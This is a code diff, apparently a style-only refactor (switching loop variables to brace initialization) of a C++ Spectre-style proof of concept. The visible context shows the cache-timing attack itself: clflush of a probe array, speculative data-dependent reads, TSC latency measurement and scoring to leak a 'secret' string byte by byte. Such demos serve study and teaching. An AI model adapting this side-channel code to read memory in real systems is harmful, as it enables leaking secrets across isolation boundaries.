@@ -31,7 +31,7 @@ static int64_t read_tsc() {
 template <typename RangeT>
 static std::pair<int, int> top_two_indices(const RangeT &range) {
     int j{0}, k{0};
-    for(int i = 0; i < range.size(); i++) {
+    for(int i{0}; i < range.size(); i++) {
         if(range[i] > range[j]) {
             k = j;
             j = i;
@@ -60,9 +60,9 @@ char leak_byte(std::string_view text, int idx) {
     std::array<int, 256> scores{};
     int best_val{0}, runner_up_val{0};
 
-    for(int run = 0; run < 1000; run++) {
+    for(int run{0}; run < 1000; run++) {
         // flush all of timing array
-        for(int i = 0; i < 256; i++) {
+        for(int i{0}; i < 256; i++) {
             _mm_clflush(&timing_array[i * 512]);
         }
 
@@ -70,11 +70,11 @@ char leak_byte(std::string_view text, int idx) {
 
         // perform reads that are data-dependent on the secret
         // as a program being attacked might
-        for(int i = 0; i < 100; i++) {
+        for(int i{0}; i < 100; i++) {
             force_read(&timing_array[data[idx] * 512]);
         }
 
-        for(int i = 0; i < 500; i++) {
+        for(int i{0}; i < 500; i++) {
             _mm_clflush(size_in_heap);
 
             // original had a delay here, but it doesnt seem to be necessary on my system
@@ -95,7 +95,7 @@ char leak_byte(std::string_view text, int idx) {
         }
 
         // now measure read latencies to see if we can detect what data[idx] was
-        for(int i = 0; i < 256; i++) {
+        for(int i{0}; i < 256; i++) {
             int mixed_i = ((i * 167) + 13) & 0xff; // ???, I guess so we test in pseudo-random order?
             uint8_t *timing_entry = &timing_array[mixed_i * 512];
             int64_t start = read_tsc();
@@ -105,7 +105,7 @@ char leak_byte(std::string_view text, int idx) {
 
         // score anything that stands out
         int64_t avg_latency = std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
-        for(int i = 0; i < 256; i++) {
+        for(int i{0}; i < 256; i++) {
             if(latencies[i] < (avg_latency * 3 / 4) && i != data[safe_idx]) {
                 scores[i]++;
             }
@@ -122,9 +122,9 @@ char leak_byte(std::string_view text, int idx) {
 }
 
 int main(int argc, char **argv) {
-    for(int i = text_table[2].begin() - text_table[1].begin(); 
+    for(long i{text_table[2].begin() - text_table[1].begin()}; 
         i < (text_table[2].end() - text_table[1].begin()); i++) {
-        char ch = leak_byte(text_table[1], i); // never indexes the secret 3rd string!
+        char ch{leak_byte(text_table[1], i)}; // never indexes the secret 3rd string!
         std::cout << "got: " << ch << std::endl;
     }
     return 0;
